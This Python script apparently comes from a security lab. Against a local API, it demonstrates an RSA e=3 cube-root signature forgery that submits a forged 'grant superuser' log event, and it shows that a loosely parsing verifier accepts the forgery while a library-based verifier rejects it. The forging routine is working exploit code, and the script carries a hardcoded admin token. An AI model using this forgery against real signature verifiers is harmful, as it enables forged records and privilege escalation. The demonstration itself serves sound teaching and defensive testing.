#!/usr/bin/env python3
"""
RSA PKCS#1 v1.5: SECURE vs VULNERABLE Comparison

This script demonstrates:
1. Same forged signature works on vulnerable verifier
2. Same forged signature is REJECTED by secure verifier

Uses the EXACT SAME forge method as comprehensive_forge_demo.py
"""

import base64
import hashlib
import json
import socket
import secrets
import time
import requests
from typing import Optional
from datetime import datetime, timezone

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

API_BASE = "http://localhost"
ADMIN_TOKEN = "my-super-secret-admin-token-2025"

# Burp Suite proxy settings
BURP_PROXY_HOST = "127.0.0.1"
BURP_PROXY_PORT = 8080
BURP_PROXIES = None


def check_burp_proxy() -> bool:
    """Check if Burp Suite proxy is running on port 8080."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((BURP_PROXY_HOST, BURP_PROXY_PORT))
        sock.close()
        return result == 0
    except Exception:
        return False


def setup_proxy():
    """Setup proxy if Burp Suite is detected."""
    global BURP_PROXIES
    if check_burp_proxy():
        BURP_PROXIES = {
            "http": f"http://{BURP_PROXY_HOST}:{BURP_PROXY_PORT}",
            "https": f"http://{BURP_PROXY_HOST}:{BURP_PROXY_PORT}"
        }
        print(f"  🔍 Burp Suite detected on port {BURP_PROXY_PORT}")
        print(f"  📡 All requests will go through proxy")
        return True
    else:
        print(f"  ℹ️  Burp Suite not detected on port {BURP_PROXY_PORT}")
        print(f"  📡 Requests will go directly to API")
        return False


def make_request(method: str, url: str, **kwargs) -> requests.Response:
    """Make HTTP request, optionally through Burp proxy."""
    kwargs.setdefault('timeout', 10)
    if BURP_PROXIES:
        kwargs['proxies'] = BURP_PROXIES
        kwargs['verify'] = False
    
    if method.upper() == 'GET':
        return requests.get(url, **kwargs)
    elif method.upper() == 'POST':
        return requests.post(url, **kwargs)
    else:
        raise ValueError(f"Unsupported method: {method}")


def integer_nth_root(x: int, n: int) -> int:
    """Integer n-th root using Newton's method."""
    if x == 0:
        return 0
    guess = 1 << ((x.bit_length() + n - 1) // n)
    while True:
        new = ((n - 1) * guess + x // (guess ** (n - 1))) // n
        if new >= guess:
            return guess
        guess = new


def forge_signature_cube_root(message: bytes, n: int, key_size: int = 256) -> Optional[bytes]:
    """
    Forge RSA signature using cube root attack (e=3).
    
    This is the EXACT SAME method used in comprehensive_forge_demo.py
    """
    target_hash = hashlib.sha256(message).digest()
    
    prefix = b'\x00\x01\xff\x00'
    garbage_len = key_size - len(prefix) - len(target_hash)
    
    # Put hash right after prefix
    em = prefix + target_hash + b'\x00' * garbage_len
    em_int = int.from_bytes(em, byteorder='big')
    
    sig = integer_nth_root(em_int, 3)
    
    # Check with small deltas
    for delta in range(-100, 101):
        s = sig + delta
        if s <= 0:
            continue
        
        check = pow(s, 3, n)
        check_bytes = check.to_bytes(key_size, byteorder='big')
        
        if check_bytes[0:2] != b'\x00\x01':
            continue
        
        for i in range(2, min(20, key_size)):
            if check_bytes[i] == 0x00:
                if target_hash in check_bytes[i+1:]:
                    return s.to_bytes(key_size, byteorder='big')
                break
    
    # Try with random garbage
    for attempt in range(1000):
        garbage = secrets.token_bytes(garbage_len)
        em = prefix + target_hash + garbage
        em_int = int.from_bytes(em, byteorder='big')
        sig = integer_nth_root(em_int, 3)
        
        for delta in range(-50, 51):
            s = sig + delta
            if s <= 0:
                continue
            
            check = pow(s, 3, n)
            check_bytes = check.to_bytes(key_size, byteorder='big')
            
            if check_bytes[0:2] != b'\x00\x01':
                continue
            
            for i in range(2, min(20, key_size)):
                if check_bytes[i] == 0x00:
                    if target_hash in check_bytes[i+1:]:
                        return s.to_bytes(key_size, byteorder='big')
                    break
    
    return None


def setup_key(algorithm: str) -> tuple:
    """Register and approve an RSA key with e=3."""
    ts = int(time.time())
    rand = secrets.randbelow(10000)
    service_id = f"demo-{algorithm[:10]}-{ts}-{rand}"
    
    # Generate RSA key with e=3
    private_key = rsa.generate_private_key(
        public_exponent=3,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()
    
    n = public_key.public_numbers().n
    key_size = (n.bit_length() + 7) // 8
    
    # Register
    resp = make_request(
        'POST',
        f"{API_BASE}/v1/keys/register",
        json={"service_id": service_id, "public_key_pem": pem, "algorithm": algorithm}
    )
    if resp.status_code not in (200, 201):
        raise Exception(f"Register failed: {resp.text}")
    
    key_id = resp.json().get("public_key_id")
    
    # Approve
    make_request(
        'POST',
        f"{API_BASE}/v1/admin/keys/review",
        headers={"X-Admin-Token": ADMIN_TOKEN},
        json={"public_key_id": key_id, "action": "approve"}
    )
    
    return service_id, key_id, n, key_size


def send_forged_event(service_id: str, key_id: str, event: dict, signature: bytes) -> dict:
    """Send forged event to API."""
    resp = make_request(
        'POST',
        f"{API_BASE}/v1/logs",
        json={
            "service_id": service_id,
            "event_type": "FORGED_EVENT",
            "event": json.dumps(event, sort_keys=True, separators=(',', ':')),
            "event_data": event,
            "signature": base64.b64encode(signature).decode(),
            "public_key_id": key_id
        }
    )
    try:
        return {"status": resp.status_code, "body": resp.json()}
    except:
        return {"status": resp.status_code, "body": resp.text}


def main():
    print("="*70)
    print("  RSA PKCS#1 v1.5: SECURE vs VULNERABLE")
    print("  Same Forged Signature - Different Results")
    print("="*70)
    
    # Proxy detection
    print(f"\n{'━'*60}")
    print("  PROXY DETECTION")
    print(f"{'━'*60}\n")
    setup_proxy()
    
    # Create the SAME event for both tests
    event = {
        "action": "admin.grant_superuser",
        "actor": "admin@corp.com",
        "target": "attacker@evil.com",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "note": "FORGED - attacker never had private key!"
    }
    message = json.dumps(event, sort_keys=True, separators=(',', ':')).encode()
    msg_hash = hashlib.sha256(message).digest()
    
    print(f"\n{'━'*60}")
    print("  EVENT TO FORGE")
    print(f"{'━'*60}")
    print(f"\n  Message hash: {msg_hash.hex()[:32]}...")
    print(f"  Event: {json.dumps(event, indent=4)}")
    
    results = []
    forged_sig = None
    
    # ========================================
    # TEST 1: VULNERABLE VERIFIER
    # ========================================
    print(f"\n{'━'*60}")
    print("  TEST 1: rsa-pkcs1v15-vulnerable (WEAK VERIFIER)")
    print(f"{'━'*60}\n")
    
    try:
        service_id, key_id, n, key_size = setup_key("rsa-pkcs1v15-vulnerable")
        print(f"  ✓ Key registered: {key_id}")
        print(f"  n: {n.bit_length()} bits, e: 3")
        
        print(f"\n  Forging signature (cube root attack)...")
        forged_sig = forge_signature_cube_root(message, n, key_size)
        
        if forged_sig:
            print(f"  ✓ Signature forged!")
            print(f"    {forged_sig.hex()[:40]}...")
            
            result = send_forged_event(service_id, key_id, event, forged_sig)
            print(f"\n  API Response:")
            print(f"    Status: {result['status']}")
            print(f"    Body: {result['body']}")
            
            if result['status'] == 200:
                print(f"\n  {'!'*50}")
                print(f"  ⚠️  ATTACK SUCCESSFUL - VULNERABLE!")
                print(f"  {'!'*50}")
                results.append(("rsa-pkcs1v15-vulnerable", "⚠️ BYPASSED"))
            else:
                results.append(("rsa-pkcs1v15-vulnerable", "REJECTED"))
        else:
            print(f"  ✗ Forge failed")
            results.append(("rsa-pkcs1v15-vulnerable", "FORGE_FAILED"))
            
    except Exception as ex:
        print(f"  ✗ Error: {ex}")
        results.append(("rsa-pkcs1v15-vulnerable", f"ERROR: {ex}"))
    
    # ========================================
    # TEST 2: SECURE VERIFIER (same forged signature)
    # ========================================
    print(f"\n{'━'*60}")
    print("  TEST 2: rsa-pkcs1v15 (SECURE VERIFIER)")
    print(f"{'━'*60}\n")
    
    try:
        service_id2, key_id2, n2, key_size2 = setup_key("rsa-pkcs1v15")
        print(f"  ✓ Key registered: {key_id2}")
        print(f"  n: {n2.bit_length()} bits, e: 3")
        
        # Forge signature for THIS key (different n)
        print(f"\n  Forging signature (same method)...")
        forged_sig2 = forge_signature_cube_root(message, n2, key_size2)
        
        if forged_sig2:
            print(f"  ✓ Signature forged!")
            print(f"    {forged_sig2.hex()[:40]}...")
            
            result = send_forged_event(service_id2, key_id2, event, forged_sig2)
            print(f"\n  API Response:")
            print(f"    Status: {result['status']}")
            print(f"    Body: {result['body']}")
            
            if result['status'] == 200:
                print(f"\n  ⚠️ UNEXPECTED: Secure verifier accepted forged signature!")
                results.append(("rsa-pkcs1v15", "⚠️ BYPASSED (unexpected)"))
            else:
                print(f"\n  {'✓'*50}")
                print(f"  ✓ SECURE VERIFIER REJECTED FORGED SIGNATURE!")
                print(f"  {'✓'*50}")
                results.append(("rsa-pkcs1v15", "✓ PROTECTED"))
        else:
            print(f"  ✗ Forge failed (expected for secure)")
            results.append(("rsa-pkcs1v15", "FORGE_FAILED"))
            
    except Exception as ex:
        print(f"  ✗ Error: {ex}")
        results.append(("rsa-pkcs1v15", f"ERROR: {ex}"))
    
    # ========================================
    # SUMMARY
    # ========================================
    print(f"\n{'━'*60}")
    print("  SUMMARY")
    print(f"{'━'*60}")
    
    print(f"""
  ┌──────────────────────────────┬─────────────────────┐
  │         Algorithm            │       Result        │
  ├──────────────────────────────┼─────────────────────┤""")
    for algo, result in results:
        print(f"  │ {algo:<28} │ {result:<19} │")
    print(f"  └──────────────────────────────┴─────────────────────┘")
    
    print(f"""
  CONCLUSION:
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  
  Same forge method (cube root attack with e=3):
  
  • rsa-pkcs1v15-vulnerable: Uses WEAK verifier
    → Only checks prefix + hash presence
    → BYPASSED by forged signature! ⚠️
    
  • rsa-pkcs1v15 (secure): Uses cryptography library
    → Full PKCS#1 v1.5 verification
    → REJECTS forged signature ✓
    
  The vulnerability exists in the IMPLEMENTATION, not the algorithm.
  Using a proper library prevents the attack.
""")


if __name__ == "__main__":
    main()
